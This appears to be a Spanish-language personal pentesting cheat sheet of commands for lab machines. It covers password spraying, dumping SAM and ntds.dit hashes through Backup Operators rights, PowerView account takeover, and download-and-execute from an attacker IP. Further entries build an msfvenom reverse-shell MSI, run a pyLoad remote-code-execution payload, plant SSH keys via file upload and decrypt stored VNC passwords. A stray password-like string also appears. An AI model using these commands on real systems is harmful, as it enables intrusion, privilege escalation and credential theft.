En bash el operador == si la variable de la derecha no está entre comillas pueden usarse wildcards y bruteforcear la variable de la izquierda:
$var1 == $var2 Si $var1 es hola si la $var2 le asignamos el valor asterisco (*) cumplirá la igualdad porque no está entrecomillada la de la derecha.

PASAR AL OBSIDIAN.

SIEMPRE HAY QUE FIJARSE EN LAS RUTAS ABSOLUTAS Y RELATIVAS DE LOS SCRIPTS QUE SE EJECUEN YA SEA DE FORMA MANUAL O POR AUTOMATIZACIONES YA QUE PODEMOS LLEGAR A MANIPULARLOS O SUSTITUIRLOS.
REVISAR SI HAY DIRECTORIOS .git

Si falla el virtual hosting con gobuster podemos utilizar el siguiente comando de Wfuzz:

wfuzz -u http://pandora.htb -H "Host: FUZZ.pandora.htb" -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

gpg --import <key> # Importar claves gpg

gpp -d -o <fichero_final> <ficher_gpg> # Desencriptar fichero gpg

ssh -L <PUERTO_LOCAL>:localhost:<PUERTO_REMOTO> user@server

en AD querydispinfo puede dar también bastante información por los comentarios

### PASSWORD SPRAYING ###

crackmapexec smb <IP> -u <USUARIO/LISTA> -p <CONTRASEÑA>

SIEMPRE HACER EN WINDOWS SI NO SE ENCUENTRA NADA --> ls -force para poder ver archivos ocultos

### PRIVESC BACKUP OPERATORS ###

echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
echo "create" | out-file ./diskshadow.txt -encoding ascii -append        
echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append

### PRIVESC CON PAGINACION ###

Hay ciertos comnados como sytemctl, journaltcl... que si coseguimos que nos muestren resultados con paginacion podemos escalar privilegios.

diskshadow.exe /s c:\temp\diskshadow.txt

robocopy /b Z:\Windows\System32\Config C:\temp SAM
robocopy /b Z:\Windows\System32\Config C:\temp SYSTEM

download .\SAM /opt/Juggernaut/JUGG-Backup/SAM
download .\SYSTEM /opt/Juggernaut/JUGG-Backup/SYSTEM

secretsdump.py -sam SAM -system SYSTEM LOCAL

En caso de que no funcione con la SAM deberemos usar en NTDS

robocopy /b Z:\Windows\ntds . ntds.dit
reg save hklm\system c:\temp\system.bak

download ntds.dit
download system

### DECRYPT POWERSHELL CREDENTIALS ###

powershell -c "$credentials = Import-Clixml -Path .\cred.xml;$credentials.GetNetworkCredential().password"

### DOWNLOAD FILE ###

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/SharpHound.exe')

### PERMISOS WRITE OWNER SOBRE USUARIO/GRUPO ###

Set-DomainObjectOwner -identity claire -OwnerIdentity tom 

Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword 

$cred = ConvertTo-SecureString "qwer1234QWER!@#$" -AsPlainText -force
Set-DomainUserPassword -identity claire -accountpassword $cred

Ahora nos podemos loggear con las credenciales que hemos registrado

### PARA VER LOS PERMISOS ###

icacls <nomnbre archivo/carpeta>

R4v3nBe5tD3veloP3r\!123

### AlwaysInstallElevated ###
 Si encontramos tanto el HKLM Y HKCU activado para el AlwaysInstallElvated podemos instalar un archivo .msi malicioso para traernos una reverse shell con el siguiente comando:

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f msi -o evil.msi

  msiexec /q /i shell.msi


### Revertir contraseña VNC ###

echo -n <CONTRASEÑA HEXADECIMAL> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv


### PATH TRAVERSAL/LFI ###

Puede darse el caso que tenga que haber un nombre de archivo obligatorio, en el caso de que podamos crear un archivo si le ponemos ese nombre seguido de lo que nos interesa se puede liar

### NMAP DOPADO PARA TUNNELING ###

seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -open -T5 -v -n 172.17.0.1 2>&1 | grep "tcp open"

### COREDUMP ###

Si está habilitada la función de coredump mediante la siguiente línea:

// Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);

curl -X POST -H "Content-Type: multipart/form-data" http://192.168.161.249:33414/file-upload -F file="@authorized_keys.txt" -F filename="/home/alfredo/.ssh/authorized_keys"

Podemos lanzar el proceso que este compilado con la anterior línea y crasharlo con Ctrl + \ y encontrado información útil en la ruta /var/lib/apport/coredumo

También se puede crashaer mandadndolo a un segundo plano y matando parte del proceso con kill -BUS <PID> y consultado en fichero generado en /var/crash

Siempre mirar si hay mail en el sistema:

 /var/spool/exim4/
 /var/log/exim4/ ( can try our luck if any email content in log)
 /var/mail/
 /var/spool/mail/

### PYLOADER EXPLOIT ###

curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"cat /etc/passwd\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://192.168.196.26:9666/flash/addcrypted2' --proxy 127.0.0.1:8080


### PDFKIT VULNERABILTY ###

https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795


### REDIS RCE ###

https://github.com/Ridter/redis-rce

### Password reuse ###

Siempre para loggearnos como un usuario probar si su contraseña es su mismo nombre de usuario, por ejemplo patrick:patrick

### FAIL2BAN ###

https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49 (ESTA MEJOR)

https://juggernaut-sec.com/fail2ban-lpe/

### POSTGRESQL ###

DEFAULT CREDENTIALS = postgres:postgres o user postgres-r00t-us3rn4m3:postgres-r00t-p4ssw0rd

Para el RCE VISITAR TANTO:

https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions

https://github.com/squid22/PostgreSQL_RCE/blob/main/postgresql_rce.py
